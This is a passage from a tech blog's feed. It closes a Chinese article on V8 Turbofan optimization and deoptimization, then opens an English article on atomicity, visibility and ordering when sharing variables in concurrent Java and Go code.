&lt;p&gt;但隨著後半的 iteration 傳入的型別都是 String， Turbofan 過了一段時間再次把 doSomething 編譯成了針對字串參數的機器碼。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__AWTn6yUGsGVEZEgf.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;其實從上面的 trace 可以看出來，執行動態優化和反優化花費的時間大多都在 1ms 以下，然而最後的執行時間卻有如此大的差異，應該不難想像執行優化前跟優化後的代碼的效率有多大的差異了。&lt;/p&gt;
&lt;p&gt;再來我們看看這段程式碼的效率&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__4P7hndqriK0eWdQN.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__KEMsyBqrOWpWdash.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;不難看出，如果每次呼叫 doSomething 時的參數型別都持續變化，對於 Turbofan 來說是很難進行有效率的優化的。 這也正是為什麼寫 JS 時我們應該要盡可能遵守固定參數型別的原因。（ 從另一方面來看，使用 Typescript 也是有執行期效率的考量，畢竟型別都固定了，對編譯器來說很好優化）&lt;/p&gt;
&lt;p&gt;接著考慮以下這段 code&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__frVKSQdgjWzqL__Ls.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__L6lZmMx5NWshUaI__.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果我們把 &lt;strong&gt;yoo (obj)&lt;/strong&gt; 這行的註解拿掉，就符合了我們上面所講的， Stack Top 的 Frame 更改了會被其他地方存取的變數的 Shape 的狀況。這會讓 couter += obj.x 這行機器碼指令因為 obj 的形狀改變而失效。 我們印出他的 trace-opt:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__RBX4Eyd__16Ud7A__x.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__kSr7ZNJFmbrhn1QG.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我們可以看到，這次的 Deoptimization 是 soft 模式，也就是上面所談的 Lazy Deoptimization。&lt;/p&gt;
&lt;h3 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h3&gt;
&lt;p&gt;這篇文章介紹了 V8 引擎和 Turbofan 執行大家的 JS Code 時的優化方式跟原理。 寫出來的 code 越穩定好分析，編譯器就可以做越進階的優化。&lt;/p&gt;
&lt;p&gt;其實絕大多數的 Web Application都是 IO-Bound 的，如何寫出讓 Compiler 好優化的 Code 可能在很多時候都不是個很關鍵的問題，畢竟寫出讓編譯器好優化的程式碼可能會破壞許多易用好維護的軟體設計原則。 但儘管如此，作為 Web 開發者相信對 JS 背後的執行環境有深一層的認識也是一件重要的事。&lt;/p&gt;
&lt;p&gt;＊註一 ： TurboFan 所採取的 Sea-of-Nodes 是編譯器用來表示程式行為的表示方式的一種。相比傳統上常用的 Control Flow Graph 在做指令的 Scheduling 時把 Basic block 當作 Scheduling 的原子單位， Sea-of-Nodes 把所有的資料跟操作都變成單一的節點，並用 Effect-edge 來維持程式流程中的 State 關係，提升了 Scheduling 的彈性。 有興趣的人可以參考 [1]和[4]。&lt;/p&gt;
&lt;p&gt;＊註二： V8 引擎中，具有相同的 Shape（ object 中所有 attribute 的 type 和name) 的 object 都會對應到一個相同的 Map，稱之為 Hidden class，裡面存放了這些 attribute 在 memory layout 中固定的 offset，是 V8 為了加速記憶體存取速度而出現的設計。[6]&lt;/p&gt;
&lt;h3 id=&quot;references%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#references%3A&quot;&gt;#&lt;/a&gt; References:&lt;/h3&gt;
&lt;p&gt;[1] Turbofan JIT Design &lt;a href=&quot;https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170&quot;&gt;https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.g5499b9c42_01170&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] An overview of Turbofan Compiler &lt;a href=&quot;https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124&quot;&gt;https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_124&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] Turbofan IR &lt;a href=&quot;https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0&quot;&gt;https://docs.google.com/presentation/d/1Z9iIHojKDrXvZ27gRX51UxHD-bKf1QcPzSijntpMJBM/edit#slide=id.g19134d40cb_0_0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] An Introduction to TurboFan&lt;br&gt;
 &lt;a href=&quot;https://www.mdeditor.tw/pl/po7T/zh-tw&quot;&gt;https://www.mdeditor.tw/pl/po7T/zh-tw&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[5] Deoptimization in V8 &lt;a href=&quot;https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10&quot;&gt;https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.g19ea708688_0_10&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[6] V8 Hidden class &lt;br&gt;
&lt;a href=&quot;https://engineering.linecorp.com/en/blog/v8-hidden-class/&quot;&gt;https://engineering.linecorp.com/en/blog/v8-hidden-class/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[7] V8 Function Optimization &lt;br&gt;
&lt;a href=&quot;https://erdem.pl/2019/08/v-8-function-optimization&quot;&gt;https://erdem.pl/2019/08/v-8-function-optimization&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[8] Escape Analysis in V8&lt;br&gt;
 &lt;a href=&quot;https://www.youtube.com/watch?v=KiWEWLwQ3oI&quot;&gt;https://www.youtube.com/watch?v=KiWEWLwQ3oI&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[9] Turbofan Inlining Heuristics &lt;a href=&quot;https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit&quot;&gt;https://docs.google.com/document/d/1VoYBhpDhJC4VlqMXCKvae-8IGuheBGxy32EOgC2LnT8/edit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[10] JavaScript engine fundamentals: Shapes and Inline Caches&lt;br&gt;
&lt;a href=&quot;https://mathiasbynens.be/notes/shapes-ics&quot; title=&quot;https://mathiasbynens.be/notes/shapes-ics&quot;&gt;https://mathiasbynens.be/notes/shapes-ics&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>The Difference Between Java and Golang in  Writing Concurrent Code to Access Shared Variable</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/"/>
		<updated>2021-05-03T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-en/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;When writing concurrency code, we often use mechanisms like Lock or Synchronized to protect share resources (sometimes it’s a piece of code). What if we merely want to protect one variable but not a whole code? It’s too expensive to use Lock or Synchronized to protect just one variable.&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;Let’s see one simple Golang code:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;BenchmarkLocke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;testing&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;B&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		a &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; l sync&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Mutex&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			l&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			a&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;br&gt;			l&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And profiling of the code will tell you how expensive Lock cost, as shown below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/lock-profiling.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;You can see that lots of CPU time were wasted in Lock.&lt;/p&gt;
&lt;p&gt;To improve performance, often we would not use lock if we just want to protect one variable instead of the piece of code.&lt;/p&gt;
&lt;p&gt;In this article, I will introduce how to protect these share variables in Java and Golang.&lt;/p&gt;
&lt;p&gt;In the very beginning, three things need to care: &lt;strong&gt;atomicity&lt;/strong&gt;, &lt;strong&gt;visibility&lt;/strong&gt;, and &lt;strong&gt;ordering&lt;/strong&gt;. It’s too hard to understand from words, so let’s see examples directly.&lt;/p&gt;
&lt;h1 id=&quot;atomicity&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#atomicity&quot;&gt;#&lt;/a&gt; Atomicity&lt;/h1&gt;
&lt;p&gt;The action to access shared variable must be executed all in once and indivisibly. A line of code may be composed of several cpu instructions, like the codei++ is composed of 3 cpu instructions: &lt;code&gt;read value&lt;/code&gt;, &lt;code&gt;add 1 to value&lt;/code&gt; and &lt;code&gt;save value&lt;/code&gt;. If two threads run i++ simultaneously, all these cpu instructions may be executed interleaved:&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;thread1 load value 100  &lt;br&gt;thread2 load value 100  &lt;br&gt;thread1 add 1 to value 101  &lt;br&gt;thread2 add 1 to value 101  &lt;br&gt;thread1 save value 101  &lt;br&gt;thread2 save value 101&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally, we get a wrong answer: i = 101, which is not correct.&lt;br&gt;
Let’s look at a simple Java example :&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Atomic&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; times &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; counter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;times&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Line 16 should print 100000, but the value printed is always less than 100000. That’s why we must care about atomicity.&lt;/p&gt;
&lt;h1 id=&quot;visibility&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#visibility&quot;&gt;#&lt;/a&gt; Visibility&lt;/h1&gt;
&lt;p&gt;In Multicore architecture, every CPU has its cache. Thus CPU can load value from cache, which is faster than loading value from main memory. The architecture looks like below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/cpu-architecture.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;So it’s clear that the value of a variable may exist in multi CPU’s cache. If cpu1 changes the value of one variable but cpu2 did not aware of that, cpu2 may use the old value until cpu2 reload the value from main memory.&lt;/p&gt;
&lt;p&gt;Here is simple Java code to show the problem:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token comment&quot;&gt;// do nothing&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Unreachable&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt; bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Even thread t2 had changed the flag to true in line 12, thread t1 would still live in an infinite loop in line 4~6. That’s because t1 does not see a new value of the flag.&lt;/p&gt;
&lt;h1 id=&quot;ordering&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#ordering&quot;&gt;#&lt;/a&gt; Ordering&lt;/h1&gt;
&lt;p&gt;Sometimes the compile would reordering instructions due to the purpose of optimizations. As a result, the ordering of instructions running in your machine may not as your imagination. See these three codes:&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;a = 1  &lt;br&gt;b = 2  &lt;br&gt;c = a + b&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;line 3 is a dependency on line1 &amp;amp; line2, so the real ordering of instructions may like below:&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;b = 2  &lt;br&gt;a = 1  &lt;br&gt;c = a + b&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It’s ok when your code is running on a single thread. But when running on multi-thread, the reordering may cause some bug you can not understand. Take the code for example:&lt;/p&gt;
